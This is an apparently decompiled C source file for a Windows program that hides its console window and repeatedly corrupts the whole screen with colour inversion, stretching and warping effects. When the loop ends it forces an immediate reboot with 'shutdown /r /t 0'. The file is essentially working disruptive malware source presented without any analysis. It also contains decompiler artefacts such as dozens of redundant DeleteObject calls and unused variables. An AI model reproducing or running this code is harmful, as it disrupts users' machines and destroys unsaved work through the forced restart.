#include <Windows.h>
BOOL __cdecl rt(int a1)
{
    POINT Point; // [esp+30h] [ebp-58h]
    int v3; // [esp+38h] [ebp-50h]
    int v4; // [esp+3Ch] [ebp-4Ch]
    int v5; // [esp+40h] [ebp-48h]
    int v6; // [esp+44h] [ebp-44h]
    struct tagRECT Rect; // [esp+48h] [ebp-40h]
    int v8; // [esp+58h] [ebp-30h]
    int v9; // [esp+5Ch] [ebp-2Ch]
    HDC hdcDest; // [esp+60h] [ebp-28h]
    HDC v11; // [esp+64h] [ebp-24h]
    HWND hWnd; // [esp+68h] [ebp-20h]
    int v13; // [esp+6Ch] [ebp-1Ch]
    int v14; // [esp+70h] [ebp-18h]
    int v15; // [esp+74h] [ebp-14h]
    int v16; // [esp+78h] [ebp-10h]
    HDC v17; // [esp+7Ch] [ebp-Ch]

    v17 = GetDC(0);
    v16 = GetSystemMetrics(0);
    v15 = GetSystemMetrics(1);
    v14 = 0;
    v13 = 0;
    hWnd = GetDesktopWindow();
    v11 = GetWindowDC(hWnd);
    hdcDest = GetDC(0);
    GetWindowRect(hWnd, &Rect);
    v9 = GetSystemMetrics(0);
    v8 = GetSystemMetrics(1);
    Point.x = Rect.left + a1;
    Point.y = Rect.top - a1;
    v3 = Rect.right + a1;
    v4 = Rect.top + a1;
    v5 = Rect.left - a1;
    v6 = Rect.bottom - a1;
    return PlgBlt(hdcDest, &Point, hdcDest, Rect.left, Rect.top, Rect.right - Rect.left, Rect.bottom - Rect.top, 0, 0, 0);
}
BOOL __cdecl rt2(int a1)
{
    POINT Point; // [esp+30h] [ebp-58h]
    int v3; // [esp+38h] [ebp-50h]
    int v4; // [esp+3Ch] [ebp-4Ch]
    int v5; // [esp+40h] [ebp-48h]
    int v6; // [esp+44h] [ebp-44h]
    struct tagRECT Rect; // [esp+48h] [ebp-40h]
    int v8; // [esp+58h] [ebp-30h]
    int v9; // [esp+5Ch] [ebp-2Ch]
    HDC hdcDest; // [esp+60h] [ebp-28h]
    HDC v11; // [esp+64h] [ebp-24h]
    HWND hWnd; // [esp+68h] [ebp-20h]
    int v13; // [esp+6Ch] [ebp-1Ch]
    int v14; // [esp+70h] [ebp-18h]
    int v15; // [esp+74h] [ebp-14h]
    int v16; // [esp+78h] [ebp-10h]
    HDC v17; // [esp+7Ch] [ebp-Ch]

    v17 = GetDC(0);
    v16 = GetSystemMetrics(0);
    v15 = GetSystemMetrics(1);
    v14 = 0;
    v13 = 0;
    hWnd = GetDesktopWindow();
    v11 = GetWindowDC(hWnd);
    hdcDest = GetDC(0);
    GetWindowRect(hWnd, &Rect);
    v9 = GetSystemMetrics(0);
    v8 = GetSystemMetrics(1);
    Point.x = Rect.left - a1;
    Point.y = Rect.top + a1;
    v3 = Rect.right - a1;
    v4 = Rect.top - a1;
    v5 = Rect.left + a1;
    v6 = Rect.bottom + a1;
    return PlgBlt(hdcDest, &Point, hdcDest, Rect.left, Rect.top, Rect.right - Rect.left, Rect.bottom - Rect.top, 0, 0, 0);
}

int __cdecl main(int argc, const char** argv, const char** envp)
{
    HWND v3; // eax
    HWND v4; // eax
    HWND v5; // eax
    int v6; // ebx
    int v7; // ebx
    int v8; // eax
    HBRUSH v9; // eax
    HWND v10; // eax
    HWND v11; // eax
    int v12; // ebx
    int v13; // ebx
    int v14; // eax
    HBRUSH v15; // eax
    int v16; // edi
    int v17; // esi
    int v18; // ebx
    int v19; // eax
    HRGN v20; // eax
    int v21; // ebx
    int v22; // ebx
    int v23; // eax
    HBRUSH v24; // eax
    int v25; // ebx
    int v26; // eax
    int v27; // ebx
    int v28; // eax
    int v29; // edi
    int v30; // esi
    int v31; // ebx
    int v32; // eax
    int v33; // ebx
    int v34; // eax
    int v35; // ebx
    int v36; // eax
    int v37; // ebx
    int v38; // eax
    int v39; // ebx
    int v40; // eax
    int v41; // ebx
    int v42; // eax
    int v43; // ebx
    int v44; // eax
    int v45; // ebx
    int v46; // eax
    int v47; // ebx
    int v48; // eax
    int v49; // ebx
    int v50; // eax
    int v51; // ebx
    int v52; // eax
    char v54; // [esp+0h] [ebp-ACh]
    int v55; // [esp+10h] [ebp-9Ch]
    int v56; // [esp+14h] [ebp-98h]
    int v57; // [esp+18h] [ebp-94h]
    int v58; // [esp+1Ch] [ebp-90h]
    HBRUSH v59; // [esp+20h] [ebp-8Ch]
    HBRUSH v60; // [esp+24h] [ebp-88h]
    int v61; // [esp+28h] [ebp-84h]
    int v62; // [esp+2Ch] [ebp-80h]
    HDC v63; // [esp+30h] [ebp-7Ch]
    HDC v64; // [esp+34h] [ebp-78h]
    int v65; // [esp+38h] [ebp-74h]
    int v66; // [esp+3Ch] [ebp-70h]
    int v67; // [esp+40h] [ebp-6Ch]
    int v68; // [esp+44h] [ebp-68h]
    int v69; // [esp+48h] [ebp-64h]
    int v70; // [esp+4Ch] [ebp-60h]
    int v71; // [esp+50h] [ebp-5Ch]
    int v72; // [esp+54h] [ebp-58h]
    int v73; // [esp+58h] [ebp-54h]
    HDC v74; // [esp+5Ch] [ebp-50h]
    HWND v75; // [esp+60h] [ebp-4Ch]
    int v76; // [esp+64h] [ebp-48h]
    int v77; // [esp+68h] [ebp-44h]
    int v78; // [esp+6Ch] [ebp-40h]
    int v79; // [esp+70h] [ebp-3Ch]
    HDC v80; // [esp+74h] [ebp-38h]
    int v81; // [esp+78h] [ebp-34h]
    int v82; // [esp+7Ch] [ebp-30h]
    int v83; // [esp+80h] [ebp-2Ch]
    int v84; // [esp+84h] [ebp-28h]
    int v85; // [esp+88h] [ebp-24h]
    int v86; // [esp+8Ch] [ebp-20h]
    int v87; // [esp+90h] [ebp-1Ch]
    int* v88; // [esp+9Ch] [ebp-10h]

    v88 = &argc;
    v3 = GetConsoleWindow();
    ShowWindow(v3, 0);
    v4 = GetDesktopWindow();
    v80 = GetDC(v4);
    v79 = GetSystemMetrics(0);
    v78 = GetSystemMetrics(1);
    v87 = 0;
    v86 = 0;
    v85 = 0;
    v84 = 0;
    v83 = 0;
    v82 = 0;
    while (1)
    {
        do
        {
            ++v87;
            ++v86;
            ++v85;
        } while (v87 <= 299);
        v77 = 0;
        v76 = 0;
        v75 = GetDesktopWindow();
        v74 = GetWindowDC(v75);
        GetWindowRect(v75, (LPRECT)&v55);
        v73 = v57 - v55;
        v72 = v58 - v56;
        StretchBlt(v74, 50, 50, v57 - v55 - 100, v58 - v56 - 100, v74, 0, 0, v57 - v55, v58 - v56, 0xCC0020u);
        Sleep(0x12Du);
        v71 = 0;
        v70 = 0;
        v5 = GetDesktopWindow();
        v74 = GetWindowDC(v5);
        v77 = GetSystemMetrics(0);
        v76 = GetSystemMetrics(1);
        v71 = rand() % v77;
        v70 = rand() % v76;
        v6 = (unsigned __int8)(rand() % 225);
        v7 = v6 | ((unsigned __int8)(rand() % 225) << 8);
        v8 = rand();
        v9 = CreateSolidBrush(v7 | ((unsigned __int8)(v8 % 225) << 16));
        SelectObject(v74, v9);
        PatBlt(v74, 0, 0, v77, v76, 0x5A0049u);
        Sleep(1u);
        v10 = GetDesktopWindow();
        v74 = GetWindowDC(v10);
        v77 = GetSystemMetrics(0);
        v76 = GetSystemMetrics(1);
        if (v86 > 329)
        {
            v69 = 0;
            v68 = 0;
            v67 = 0;
            v66 = 0;
            v11 = GetDesktopWindow();
            v74 = GetWindowDC(v11);
            v69 = GetSystemMetrics(0);
            v68 = GetSystemMetrics(1);
            v67 = rand() % v69;
            v66 = rand() % v68;
            v12 = (unsigned __int8)(rand() % 225);
            v13 = v12 | ((unsigned __int8)(rand() % 225) << 8);
            v14 = rand();
            v15 = CreateSolidBrush(v13 | ((unsigned __int8)(v14 % 225) << 16));
            SelectObject(v74, v15);
            PatBlt(v74, 0, 0, v69, v68, 0x5A0049u);
            Sleep(1u);
            PatBlt(v74, 0, 0, v69, v68, 0x5A0049u);
            PatBlt(v74, 0, 0, v69, v68, 0x5A0049u);
            Sleep(0x15u);
            PatBlt(v74, 0, 0, v69, v68, 0x5A0049u);
            PatBlt(v74, 0, 0, v69, v68, 0x5A0049u);
            Sleep(0xDu);
            PatBlt(v74, 0, 0, v69, v68, 0x5A0049u);
            Sleep(1u);
        }
        v65 = 0;
        if (v85 > 339)
        {
            ++v84;
            v64 = GetDC(0);
            v16 = rand() % 100;
            v17 = rand() % 100;
            v18 = rand() % 920;
            v19 = rand();
            v20 = CreateEllipticRgn(v19 % 920, v18, v17, v16);
            InvertRgn(v64, v20);
            if (v84 > 19)
            {
                ++v83;
                Sleep(5u);
                v77 = GetSystemMetrics(0);
                v76 = GetSystemMetrics(1);
                v71 = rand() % v77;
                v70 = rand() % v76;
                v21 = (unsigned __int8)(rand() % 225);
                v22 = v21 | ((unsigned __int8)(rand() % 225) << 8);
                v23 = rand();
                v24 = CreateSolidBrush(v22 | ((unsigned __int8)(v23 % 225) << 16));
                SelectObject(v64, v24);
                PatBlt(v64, 0, 0, v77, v76, 0x5A0049u);
                Sleep(1u);
                rt(150);
                rt2(100);
                rt(150);
                rt2(150);
                rt(150);
                rt2(150);
                rt(150);
                rt2(150);
                if (++v83 > 19)
                {
                    v63 = GetDC(0);
                    v62 = GetSystemMetrics(0);
                    v61 = GetSystemMetrics(1);
                    GetWindowRect(v75, (LPRECT)&v54);
                    v81 = 0;
                    while (1)
                    {
                        ++v81;
                        v81 %= 5;
                        if (!v81)
                            break;
                        v25 = (unsigned __int8)(rand() % 255);
                        v26 = rand();
                        v27 = v25 | ((unsigned __int8)(v26 - v26 / -255) << 8);
                        v28 = rand();
                        v60 = CreateSolidBrush(v27 | ((unsigned __int8)(v28 - v28 / -255) << 16));
                        SelectObject(v63, v60);
                        v29 = rand() % 80;
                        v30 = rand() % 80;
                        v31 = rand() % 80;
                        v32 = rand();
                        Sleep(0x64u);
                    }
                    v33 = rand() % v61;
                    v34 = rand();
                    StretchBlt(v63, v34 % v62, v33, v62, v61, v63, 0, 0, v62, v61, 0xCC0020u);
                    StretchBlt(v63, 10, 10, v62 - 20, v61 - 20, v63, 0, 0, v62, v61, 0xEE0086u);
                    StretchBlt(v63, -10, -10, v62 + 20, v61 + 20, v63, 0, 0, v62, v61, 0xEE0086u);
                    v35 = rand() % v61;
                    v36 = rand();
                    StretchBlt(v63, 0, 0, v62, v61, v63, v36 % v62, v35, v62, v61, 0x660046u);
                    v37 = (unsigned __int8)(rand() % 255);
                    v38 = rand();
                    v39 = v37 | ((unsigned __int8)(v38 - v38 / -255) << 8);
                    v40 = rand();
                    v59 = CreateSolidBrush(v39 | ((unsigned __int8)(v40 - v40 / -255) << 16));
                    SelectObject(v63, v59);
                    PatBlt(v63, 0, 0, v62, v61, 0x5A0049u);
                    v41 = rand() % v61;
                    v42 = rand();
                    StretchBlt(v63, v42 % v62, v41, v62, v61, v63, 0, 0, v62, v61, 0xCC0020u);
                    StretchBlt(v63, 10, 10, v62 - 20, v61 - 20, v63, 0, 0, v62, v61, 0xEE0086u);
                    StretchBlt(v63, -10, -10, v62 + 20, v61 + 20, v63, 0, 0, v62, v61, 0xEE0086u);
                    v43 = rand() % v61;
                    v44 = rand();
                    StretchBlt(v63, 0, 0, v62, v61, v63, v44 % v62, v43, v62, v61, 0x660046u);
                    SelectObject(v63, v59);
                    PatBlt(v63, 0, 0, v62, v61, 0x5A0049u);
                    v45 = rand() % v61;
                    v46 = rand();
                    StretchBlt(v63, v46 % v62, v45, v62, v61, v63, 0, 0, v62, v61, 0xCC0020u);
                    StretchBlt(v63, 10, 10, v62 - 20, v61 - 20, v63, 0, 0, v62, v61, 0xEE0086u);
                    StretchBlt(v63, -10, -10, v62 + 20, v61 + 20, v63, 0, 0, v62, v61, 0xEE0086u);
                    v47 = rand() % v61;
                    v48 = rand();
                    StretchBlt(v63, 0, 0, v62, v61, v63, v48 % v62, v47, v62, v61, 0x660046u);
                    SelectObject(v63, v59);
                    PatBlt(v63, 0, 0, v62, v61, 0x5A0049u);
                    v49 = rand() % v61;
                    v50 = rand();
                    StretchBlt(v63, v50 % v62, v49, v62, v61, v63, 0, 0, v62, v61, 0xCC0020u);
                    StretchBlt(v63, 10, 10, v62 - 20, v61 - 20, v63, 0, 0, v62, v61, 0xEE0086u);
                    StretchBlt(v63, -10, -10, v62 + 20, v61 + 20, v63, 0, 0, v62, v61, 0xEE0086u);
                    v51 = rand() % v61;
                    v52 = rand();
                    StretchBlt(v63, 0, 0, v62, v61, v63, v52 % v62, v51, v62, v61, 0x660046u);
                    SelectObject(v63, v59);
                    PatBlt(v63, 0, 0, v62, v61, 0x5A0049u);
                    DeleteObject(v63);
                    DeleteObject(v63);
                    DeleteObject(v63);
                    DeleteObject(v63);
                    DeleteObject(v63);
                    DeleteObject(v63);
                    DeleteObject(v63);
                    DeleteObject(v63);
                    DeleteObject(v63);
                    DeleteObject(v63);
                    DeleteObject(v63);
                    DeleteObject(v63);
                    DeleteObject(v63);
                    DeleteObject(v63);
                    DeleteObject(v63);
                    DeleteObject(v63);
                    DeleteObject(v63);
                    DeleteObject(v63);
                    DeleteObject(v63);
                    DeleteObject(v63);
                    DeleteObject(v63);
                    DeleteObject(v63);
                    DeleteObject(v63);
                    DeleteObject(v63);
                    DeleteObject(v63);
                    DeleteObject(v63);
                    DeleteObject(v63);
                    DeleteObject(v63);
                    DeleteObject(v63);
                    DeleteObject(v63);
                    DeleteObject(v63);
                    DeleteObject(v63);
                    DeleteObject(v63);
                    DeleteObject(v63);
                    DeleteObject(v63);
                    DeleteObject(v63);
                    DeleteObject(v63);
                    DeleteObject(v63);
                    DeleteObject(v63);
                    DeleteObject(v63);
                    DeleteObject(v63);
                    DeleteObject(v63);
                    DeleteObject(v63);
                    DeleteObject(v63);
                    if (++v82 > 4)
                        break;
                }
            }
        }
    }
    system("C:\\Windows\\System32\\shutdown /r /t 0");
    return 0;
}